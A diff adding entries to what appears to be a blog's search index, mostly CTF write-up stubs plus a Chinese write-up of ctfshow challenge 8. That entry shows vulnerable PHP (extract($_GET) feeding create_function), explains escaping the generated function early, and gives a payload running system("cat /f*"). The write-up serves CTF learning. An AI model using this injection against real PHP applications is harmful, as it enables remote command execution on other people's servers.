@@ -4,6 +4,103 @@
   
     
     <entry>
+      <title>ctfshow红包挑战7_WP</title>
+      <link href="/ctfshow%E7%BA%A2%E5%8C%85%E6%8C%91%E6%88%987-WP/"/>
+      <url>/ctfshow%E7%BA%A2%E5%8C%85%E6%8C%91%E6%88%987-WP/</url>
+      
+        <content type="html"><![CDATA[<p>赛后复现</p><p>官方wp：<a href="https://ctf-show.feishu.cn/docx/IZh0deravoLG66xCrJ6caezNnKc">https://ctf-show.feishu.cn/docx/IZh0deravoLG66xCrJ6caezNnKc</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+          <category> 比赛 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+            <tag> write up </tag>
+            
+            <tag> WEB </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>NepCTF_WP</title>
+      <link href="/NepCTF-WP/"/>
+      <url>/NepCTF-WP/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+          <category> 比赛 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+            <tag> write up </tag>
+            
+            <tag> WEB </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>ctfshow红包挑战8_WP</title>
+      <link href="/ctfshow%E7%BA%A2%E5%8C%85%E6%8C%91%E6%88%988-WP/"/>
+      <url>/ctfshow%E7%BA%A2%E5%8C%85%E6%8C%91%E6%88%988-WP/</url>
+      
+        <content type="html"><![CDATA[<p>官方WP：<a href="https://ctf-show.feishu.cn/docx/Uy3xdlo9koLQtyxnlUGcpIxunUh?from=from_copylink">https://ctf-show.feishu.cn/docx/Uy3xdlo9koLQtyxnlUGcpIxunUh?from=from_copylink</a></p><h1 id="1、源码"><a href="#1、源码" class="headerlink" title="1、源码"></a>1、源码</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-08-08 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-08-08 00:26:48</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="variable">$name</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$value</span>))();</span><br></pre></td></tr></table></figure><h1 id="2、分析过程："><a href="#2、分析过程：" class="headerlink" title="2、分析过程："></a>2、分析过程：</h1><ol><li><code>extract($_GET);</code>能够实现变量覆盖，可以给<code>$name</code>和<code>$value</code>赋值。</li><li>存在<code>create_function</code>函数，可以通过这个实现rce。</li><li>若不存在<code>base64_encode</code>则可以通过<code>$value</code>实现rce，由于<code>$value</code>被<code>base64_encode</code>破坏，导致不可控，因此可以考虑使用<code>$name</code>。</li><li>参考这篇博客 <a href="https://blog.csdn.net/soldi_er/article/details/116244642?csdn_share_tail=%7B%22type%22:%22blog%22,%22rType%22:%22article%22,%22rId%22:%22116244642%22,%22source%22:%22m0_74044466%22%7D&fromshare=blogdetail">匿名函数create_function()代码注入</a> ，只要<code>create_function</code>的形参有一个可控，都能执行php代码。</li></ol><h1 id="3、create-function"><a href="#3、create-function" class="headerlink" title="3、create_function"></a>3、<code>create_function</code></h1><p>对于<code>create_function</code>函数，不能把它当成一个普通的函数看待，而是应该当成一个函数的定义过程。</p><p>比如：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="variable">$a</span>,<span class="variable">$b</span>);</span><br><span class="line">等同于</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xxxx</span>(<span class="params">   <span class="variable">$a</span>   </span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line">其中xxxx为匿名函数的函数名，<span class="variable">$a</span>为形参，<span class="variable">$b</span>为函数内执行的代码</span><br></pre></td></tr></table></figure><p>由此我们可以想，提前闭合<code>create_function</code>，结束这个函数，那么不久能将php代码逃逸出来了么</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>( <span class="variable">$a</span> , <span class="variable">$b</span> );</span><br><span class="line">若<span class="variable">$a</span>=<span class="string">&quot;)&#123;&#125;phpinfo();/*&quot;</span></span><br><span class="line">则等同于</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xxxx</span>(<span class="params">      </span>)</span>&#123;&#125;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">/*      )</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">$b;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br></pre></td></tr></table></figure><p>可以发现<code>phpinfo</code>逃了出来，为了不报错，使用<code>/*</code>（或者<code>//</code>）把后面的所有代码都注释掉，由此可以实现rce。</p><h1 id="4、payload"><a href="#4、payload" class="headerlink" title="4、payload"></a>4、payload</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=)&#123;&#125;system(&quot;cat /f*&quot;);//</span><br></pre></td></tr></table></figure><p><img src="/ctfshow%E7%BA%A2%E5%8C%85%E6%8C%91%E6%88%988-WP/1.png"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+          <category> 红包挑战 </category>
+          
+          <category> ctfshow </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+            <tag> write up </tag>
+            
+            <tag> WEB </tag>
+            
+            <tag> ctfshow </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>※CTF</title>
       <link href="/%E2%80%BBCTF/"/>
       <url>/%E2%80%BBCTF/</url>
